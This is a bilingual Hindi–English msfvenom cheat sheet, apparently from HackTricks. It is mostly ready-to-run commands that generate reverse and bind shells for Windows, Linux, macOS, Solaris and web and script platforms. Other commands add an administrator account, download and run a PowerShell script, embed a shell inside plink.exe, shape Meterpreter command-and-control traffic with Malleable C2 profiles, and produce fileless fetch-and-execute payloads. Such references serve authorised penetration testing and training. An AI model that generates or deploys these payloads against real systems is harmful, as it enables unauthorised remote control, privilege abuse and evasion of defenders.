# MSFVenom - CheatSheet

{{#include ../../banners/hacktricks-training.md}}

---

## Basic msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Payload architecture चुनने के लिए `-a` और target platform चुनने के लिए `--platform` का उपयोग करें।<sup>[[1]](#references)</sup>

## Listing
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
ये commands installed framework में उपलब्ध payload और encoder modules की सूची दिखाते हैं।<sup>[[1]](#references)</sup>

## shellcode बनाते समय सामान्य params
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
यहाँ दिखाए गए flags bad characters, output format, encoder और encoding iterations चुनते हैं।<sup>[[1]](#references)</sup>

## HTTP(S) Meterpreter traffic shaping

Metasploit 6.5 ने staged और stageless reverse HTTP(S) Meterpreter payloads में `MALLEABLEC2` option जोड़ा। Profile URIs, user agents, request/response headers, connection-ID placement और supported body encodings/wrappers को बदल सकता है। Generated payload और उसके handler, दोनों को **एक ही local profile** load करना होगा। Staged payload का Meterpreter stage के लिए initial request shaped नहीं होता, इसलिए जब first request को भी profile से match करना आवश्यक हो, तो `windows/x64/meterpreter_reverse_https` जैसे stageless payload को प्राथमिकता दें।<sup>[[3]](#references)</sup>
```bash
msfvenom -p windows/x64/meterpreter_reverse_https \
LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
-f exe -o reverse_https.exe
```
matching handler को समान payload और profile के साथ कॉन्फ़िगर करें:<sup>[[3]](#references)</sup>
```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 10.10.10.10
set LPORT 443
set MALLEABLEC2 /opt/profiles/web.profile
run
```
केवल implemented के रूप में documented directives ही traffic को प्रभावित करते हैं; unsupported profile blocks सफलतापूर्वक parse हो सकते हैं, जबकि उनका कोई प्रभाव नहीं होता।<sup>[[3]](#references)</sup>

## **Windows**

### **Reverse Shell**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### User बनाएं
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **कमांड चलाना**
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encoder
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
> **Encoding, AV evasion नहीं है:** `x86/shikata_ga_nai` जैसे encoders मुख्य रूप से bad-character constraints को पूरा करने के लिए उपयोगी होते हैं। बार-बार encoding करना reliable AV-evasion technique नहीं है।<sup>[[1]](#references)</sup>

### Executable के अंदर Embedded
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Linux Payloads

### Reverse Shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC Payloads**

### **Reverse Shell:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Shell**
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Web Based Payloads**

### **PHP**

#### Reverse shel**l**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Reverse shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Reverse shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### Reverse Shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Script Language payloads**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
## Fetch payload adapters

Fetch payloads ऐसी command बनाते हैं जो किसी उपलब्ध target utility से underlying native payload को download और execute करवाती है। इनके नाम `cmd/<platform>/<fetch-protocol>/<served-payload>` pattern का पालन करते हैं; HTTP(S), SMB और TFTP adapters उपलब्ध हैं, जबकि downloader का चुनाव target platform पर निर्भर करता है।<sup>[[2]](#references)</sup>

उदाहरण के लिए, ऐसा Linux `wget` command generate करें जो port 8080 से x64 Meterpreter payload प्राप्त करे और उसे port 4444 पर वापस connect कराए:<sup>[[2]](#references)</sup>
```bash
msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
LHOST=10.10.10.10 LPORT=4444 -f raw
```
उसी settings के साथ **fetch handler** शुरू करें; यह generated ELF को host करता है और served Meterpreter payload के लिए handler भी शुरू करता है:<sup>[[2]](#references)</sup>
```text
use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
set FETCH_COMMAND WGET
set FETCH_SRVHOST 10.10.10.10
set FETCH_SRVPORT 8080
set LHOST 10.10.10.10
set LPORT 4444
to_handler
```
उपयोगी dependent options में `FETCH_PIPE=true` शामिल है, जो समर्थित होने पर छोटा HTTP(S) command उत्पन्न करता है, और `FETCH_FILELESS=shell`, `shell-search`, या `python3.8+`, जो anonymous file descriptor से Linux ELF execute करता है। Fileless modes के लिए Linux kernel 3.17 या बाद का संस्करण आवश्यक है; सटीक adapter की जांच `msfvenom -p <FETCH_PAYLOAD> --list-options` से करें, क्योंकि supported combinations अलग-अलग होते हैं।<sup>[[2]](#references)</sup>



## References

- [1] [msfvenom का उपयोग कैसे करें](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
- [2] [Fetch Payloads का उपयोग कैसे करें](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
- [3] [Malleable C2 Profiles](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
{{#include ../../banners/hacktricks-training.md}}
